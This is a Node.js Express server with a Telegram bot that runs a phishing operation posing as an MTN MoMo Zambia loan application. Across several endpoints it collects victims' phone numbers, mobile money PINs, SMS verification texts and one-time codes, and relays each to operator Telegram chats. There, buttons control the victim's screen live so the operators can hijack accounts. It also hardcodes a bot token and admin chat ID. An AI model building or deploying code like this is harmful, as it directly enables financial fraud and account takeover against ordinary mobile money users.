const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN =
  process.env.TOKEN ||
  process.env.TELEGRAM_BOT_TOKEN ||
  '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
const RAW_APP_URL =
  process.env.APP_URL ||
  process.env.RENDER_EXTERNAL_URL ||
  (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const APP_URL = RAW_APP_URL ? RAW_APP_URL.replace(/\/+$/, '') : '';
const FALLBACK_ADMIN_ID = String(
  process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400'
).trim();

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  const map = new Map();
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      for (const [id, rec] of entries) {
        map.set(String(id), {
          username: rec.username || '',
          firstName: rec.firstName || 'User',
          lastName: rec.lastName || ''
        });
      }
    }
  } catch (err) {}

  const envSubAdmins = String(process.env.SUB_ADMIN_IDS || '')
    .split(',')
    .map((s) => s.trim())
    .filter(Boolean);

  for (const id of envSubAdmins) {
    if (id !== FALLBACK_ADMIN_ID && !map.has(id)) {
      map.set(id, { username: '', firstName: 'SubAdmin', lastName: '' });
    }
  }

  return map;
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {}
}

let bot = null;
const sessions = new Map();
const smsStore = new Map();
let lastActiveUserId = null;
const admins = loadAdmins();
saveAdmins();

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === FALLBACK_ADMIN_ID || admins.has(targetAdmin)) {
      return targetAdmin;
    }
  }
  return FALLBACK_ADMIN_ID;
}

function normalizeZeroPhone(rawPhone) {
  const digits = String(rawPhone || '').replace(/\D/g, '');
  if (!digits) return 'N/A';
  if (digits.startsWith('260')) {
    return '0' + digits.slice(3);
  }
  if (digits.startsWith('0')) {
    return digits;
  }
  if (/^(96|76|56)\d{7}$/.test(digits)) {
    return '0' + digits;
  }
  return digits;
}

function escapeMarkdown(str) {
  return String(str || '').replace(/([_*`\[])/g, '\\$1');
}

function buildAdminLink(chatId) {
  const baseUrl =
    APP_URL ||
    (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
  return baseUrl ? `${baseUrl}/?admin=${chatId}` : `/?admin=${chatId}`;
}

function formatAdminTelegramInfo(chatId, firstName, lastName, username, isMainAdmin) {
  const fullName = `${firstName || ''} ${lastName || ''}`.trim() || 'User';
  const cleanUser = username && username !== 'N/A' ? `@${escapeMarkdown(username)}` : 'N/A';
  const adminLink = buildAdminLink(chatId);
  const roleLabel = isMainAdmin
    ? '👑 *MAIN ADMIN LINK & TELEGRAM INFO*'
    : '🔗 *SUB-ADMIN LINK & TELEGRAM INFO*';

  return (
    `${roleLabel}\n\n` +
    `👤 *Name:* ${escapeMarkdown(fullName)}\n` +
    `📌 *Username:* ${cleanUser}\n` +
    `🆔 *Chat ID:* \`${chatId}\`\n` +
    `🛡️ *Role:* ${isMainAdmin ? 'Main Admin' : 'Sub-Admin'}\n\n` +
    `🌐 *Admin Link:*\n${adminLink}`
  );
}

async function initBot() {
  bot = new TelegramBot(TOKEN, { polling: true });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      let chatInfo = {};
      try {
        chatInfo = await bot.getChat(chatId);
      } catch (e) {}

      const username = chatInfo.username || msg.from.username || 'N/A';
      const firstName = chatInfo.first_name || msg.from.first_name || 'User';
      const lastName = chatInfo.last_name || msg.from.last_name || '';

      const isMainAdmin = chatId === FALLBACK_ADMIN_ID;

      if (!isMainAdmin) {
        admins.set(chatId, {
          username,
          firstName,
          lastName,
          updatedAt: new Date().toISOString()
        });
        saveAdmins();
      }

      const message = formatAdminTelegramInfo(chatId, firstName, lastName, username, isMainAdmin);
      await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);

      const firstUnderscoreIdx = actionData.indexOf('_');
      const actionType =
        firstUnderscoreIdx !== -1 ? actionData.substring(0, firstUnderscoreIdx) : actionData;
      let targetId = firstUnderscoreIdx !== -1 ? actionData.substring(firstUnderscoreIdx + 1) : '';

      if (actionType === 'COPYSMS') {
        const smsText =
          smsStore.get(targetId) || (sessions.get(targetId) && sessions.get(targetId).sms) || '';
        await bot
          .answerCallbackQuery(query.id, { text: 'SMS sent for clipboard copy', show_alert: false })
          .catch(() => {});
        await bot.sendMessage(chatId, smsText);
        return;
      }

      if (!targetId || !sessions.has(targetId)) {
        targetId = lastActiveUserId;
      }

      let session = sessions.get(targetId);
      if (!session) {
        session = { adminChatId: chatId };
        if (targetId) sessions.set(targetId, session);
      }

      const chatTarget = session.adminChatId || chatId;

      switch (actionType) {
        case 'BLOCK':
          session.status = 'BLOCKED';
          await bot.sendMessage(
            chatTarget,
            `🚫 Applicant blocked. Screen updated to blocked notice.`
          );
          break;
        case 'NEXT':
          session.status = 'PROCEED_SMS';
          await bot.sendMessage(
            chatTarget,
            `➡️ Allowed to proceed to SMS verification screen.`
          );
          break;
        case 'INCORRECT':
          session.status = 'INCORRECT_PIN';
          session.pin = '';
          await bot.sendMessage(
            chatTarget,
            `❌ Incorrect PIN triggered on applicant screen.`
          );
          break;
        case 'EXPIRED':
          session.status = 'SMS_EXPIRED';
          await bot.sendMessage(
            chatTarget,
            `⚠️ SMS Expired triggered on applicant screen.`
          );
          break;
        case 'APPROVE':
          session.status = 'PROCEED_OTP';
          await bot.sendMessage(
            chatTarget,
            `📲 SMS approved. Applicant moved to 4-Digit OTP entry screen.`
          );
          break;
        case 'OTPEXPIRED':
          session.status = 'OTP_EXPIRED';
          session.otp = '';
          await bot.sendMessage(
            chatTarget,
            `⚠️ OTP EXPIRED triggered. Applicant redirected back to enter a new 4-digit OTP.`
          );
          break;
        case 'SUCCESS':
          session.status = 'SUCCESS';
          await bot.sendMessage(
            chatTarget,
            `🎉 SUCCESS! Congratulations screen shown to applicant.`
          );
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: 'Done' }).catch(() => {});
      if (query.message && query.message.message_id) {
        await bot
          .editMessageReplyMarkup(
            { inline_keyboard: [] },
            {
              chat_id: query.message.chat.id,
              message_id: query.message.message_id
            }
          )
          .catch(() => {});
      }
    } catch (err) {}
  });
}

app.get('/health', (req, res) => {
  res.status(200).json({ ok: true, timestamp: new Date().toISOString() });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/submit-application', async (req, res) => {
  try {
    let { adminChatId, applicant, loan } = req.body || {};
    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const targetChat = resolveTargetChat(adminChatId);
    const userId = `user_${Date.now()}`;
    lastActiveUserId = userId;

    const normalizedApplicant = {
      ...(applicant || {}),
      phone: applicant && applicant.phone ? normalizeZeroPhone(applicant.phone) : undefined
    };

    sessions.set(userId, {
      adminChatId: targetChat,
      phone: normalizedApplicant.phone,
      applicant: normalizedApplicant,
      loan: loan || {},
      status: 'READY_FOR_PIN'
    });

    return res.status(200).json({ success: true, userId });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Unable to start session.' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  let session = sessions.get(userId);

  if (!session && lastActiveUserId) {
    session = sessions.get(lastActiveUserId);
  }

  if (!session) return res.status(200).json({ status: 'READY_FOR_PIN' });
  res.status(200).json({ status: session.status });
});

app.post('/api/submit-pin', async (req, res) => {
  try {
    const { userId, phone, pin, applicantName } = req.body || {};
    let activeId = userId || lastActiveUserId;
    if (!activeId) {
      activeId = `user_${Date.now()}`;
      lastActiveUserId = activeId;
    }

    let session = sessions.get(activeId);
    if (!session) {
      session = { adminChatId: FALLBACK_ADMIN_ID };
      sessions.set(activeId, session);
    }

    const cleanPhone = normalizeZeroPhone(phone || session.phone);
    if (cleanPhone !== 'N/A') session.phone = cleanPhone;
    if (applicantName) session.applicantName = applicantName;
    session.pin = pin;
    session.status = 'WAITING_PIN_REVIEW';
    lastActiveUserId = activeId;

    const targetChat = session.adminChatId || FALLBACK_ADMIN_ID;

    const message =
      `📱 *NEW MTN MOMO ZAMBIA APPLICANT*\n\n` +
      `👤 *Applicant:* ${escapeMarkdown(applicantName || session.applicantName || 'MTN MOMO ZAMBIA')}\n` +
      `📞 *Phone No:* \`${escapeMarkdown(cleanPhone)}\`\n` +
      `🔑 *5-Digit PIN:* \`${escapeMarkdown(pin)}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'BLOCK', callback_data: `BLOCK_${activeId}` },
            { text: 'NEXT', callback_data: `NEXT_${activeId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true, userId: activeId });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Failed to send PIN to Telegram.' });
  }
});

app.post('/api/submit-sms', async (req, res) => {
  try {
    const { userId, phone, sms, autoDetected } = req.body || {};
    let activeId = userId || lastActiveUserId;
    if (!activeId) {
      activeId = `user_${Date.now()}`;
      lastActiveUserId = activeId;
    }

    let session = sessions.get(activeId);
    if (!session) {
      session = { adminChatId: FALLBACK_ADMIN_ID };
      sessions.set(activeId, session);
    }

    const cleanPhone = normalizeZeroPhone(phone || session.phone);
    const cleanSms = String(sms || '').trim();
    session.sms = cleanSms;
    if (cleanPhone !== 'N/A') session.phone = cleanPhone;
    session.status = 'WAITING_SMS_REVIEW';
    smsStore.set(activeId, cleanSms);
    lastActiveUserId = activeId;

    const targetChat = session.adminChatId || FALLBACK_ADMIN_ID;

    const message =
      `✉️ *MTN MOMO SMS VERIFICATION* ${autoDetected ? '(Auto-Submitted)' : ''}\n\n` +
      `📞 *Phone No:* \`${escapeMarkdown(cleanPhone)}\`\n` +
      `📩 *SMS Message:*\n\`${escapeMarkdown(cleanSms)}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '📋 Copy SMS', callback_data: `COPYSMS_${activeId}` }],
          [
            { text: 'SMS EXPIRES', callback_data: `EXPIRED_${activeId}` },
            { text: 'INCORRECT PIN', callback_data: `INCORRECT_${activeId}` },
            { text: 'APPROVE', callback_data: `APPROVE_${activeId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Failed to send SMS to Telegram.' });
  }
});

app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, phone, otp, autoSubmitted } = req.body || {};
    let activeId = userId || lastActiveUserId;
    if (!activeId) {
      activeId = `user_${Date.now()}`;
      lastActiveUserId = activeId;
    }

    let session = sessions.get(activeId);
    if (!session) {
      session = { adminChatId: FALLBACK_ADMIN_ID };
      sessions.set(activeId, session);
    }

    const cleanPhone = normalizeZeroPhone(phone || session.phone);
    const cleanOtp = String(otp || '').replace(/\D/g, '').slice(0, 4);
    if (cleanPhone !== 'N/A') session.phone = cleanPhone;
    session.otp = cleanOtp;
    session.status = 'WAITING_OTP_REVIEW';
    lastActiveUserId = activeId;

    const targetChat = session.adminChatId || FALLBACK_ADMIN_ID;

    const message =
      `🔐 *MTN MOMO 4-DIGIT OTP* ${autoSubmitted ? '(Auto-Submitted)' : ''}\n\n` +
      `📞 *Phone No:* \`${escapeMarkdown(cleanPhone)}\`\n` +
      `🔢 *4-Digit OTP:* \`${escapeMarkdown(cleanOtp)}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'OTP EXPIRED', callback_data: `OTPEXPIRED_${activeId}` },
            { text: 'SUCCESS', callback_data: `SUCCESS_${activeId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Failed to send OTP to Telegram.' });
  }
});

app.post('/api/request-new-sms', async (req, res) => {
  try {
    const { userId, phone } = req.body || {};
    let activeId = userId || lastActiveUserId;
    let session = sessions.get(activeId);
    if (!session) {
      session = { adminChatId: FALLBACK_ADMIN_ID };
    }

    const cleanPhone = normalizeZeroPhone(phone || session.phone);
    const targetChat = session.adminChatId || FALLBACK_ADMIN_ID;
    const message =
      `🔔 *NEW SMS REQUESTED*\n\n` +
      `📞 *Phone No:* \`${escapeMarkdown(cleanPhone)}\`\n` +
      `⏳ Applicant requested a new verification SMS after the 15s timer ended.`;

    if (targetChat && bot) await bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' });
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Failed to notify admin.' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
  console.log(`Server running on port ${PORT}`);
});
  
